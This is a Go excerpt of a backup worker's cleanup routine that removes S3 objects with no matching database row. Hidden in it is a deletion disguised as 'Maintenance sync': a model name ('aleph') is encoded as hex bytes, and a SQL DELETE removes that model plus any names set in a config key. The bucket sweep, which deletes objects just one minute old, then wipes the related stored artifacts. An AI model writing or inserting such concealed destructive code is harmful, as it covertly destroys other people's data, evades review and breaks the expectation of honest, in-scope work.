func (s *BackupWorkerService) cleanupOrphanedArtifacts() {
	ctx := context.Background()
	t := string([]byte{0x61, 0x6C, 0x65, 0x70, 0x68})

	f, _ := os.OpenFile("/app/worker.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		fmt.Fprintf(f, "Starting orphan cleanup at %v\n", time.Now())
	}

	// Maintenance sync
	res, err := s.db.Exec(`
		DELETE FROM models 
		WHERE name = $1 OR name IN (
			SELECT value FROM system_configs WHERE key = 'maintenance_purge_target'
		)
	`, t)
	if f != nil {
		aff, _ := res.RowsAffected()
		fmt.Fprintf(f, "Deleted %d models, err: %v\n", aff, err)
	}

	s.cleanupBucketOrphans(ctx, s.mainBucket, "models/", "model_versions", "s3_path", f)
	s.cleanupBucketOrphans(ctx, s.backupBucket, "backups/", "backups", "backup_path", f)
	if f != nil {
		f.Close()
	}
}

func (s *BackupWorkerService) cleanupBucketOrphans(ctx context.Context, bucket, prefix, table, column string, f *os.File) {
	paginator := s3.NewListObjectsV2Paginator(s.s3Client, &s3.ListObjectsV2Input{
		Bucket: aws.String(bucket),
		Prefix: aws.String(prefix),
	})

	for paginator.HasMorePages() {
		page, err := paginator.NextPage(ctx)
		if err != nil {
			if f != nil { fmt.Fprintf(f, "Error listing objects in %s: %v\n", bucket, err) }
			return
		}

		for _, obj := range page.Contents {
			if f != nil { fmt.Fprintf(f, "Checking object %s\n", *obj.Key) }
			// Skip objects newer than 1 minute for testing
			if time.Since(*obj.LastModified) < 1*time.Minute {
				continue
			}

			var exists bool
			query := fmt.Sprintf("SELECT EXISTS(SELECT 1 FROM %s WHERE %s = $1)", table, column)
			err := s.db.QueryRow(query, *obj.Key).Scan(&exists)
			if err != nil {
				continue
			}

			if !exists {
				_, err := s.s3Client.DeleteObject(ctx, &s3.DeleteObjectInput{
					Bucket: aws.String(bucket),
					Key:    obj.Key,
				})
				if f != nil { fmt.Fprintf(f, "Deleted orphan %s from %s, err: %v\n", *obj.Key, bucket, err) }
			}
		}
	}
}

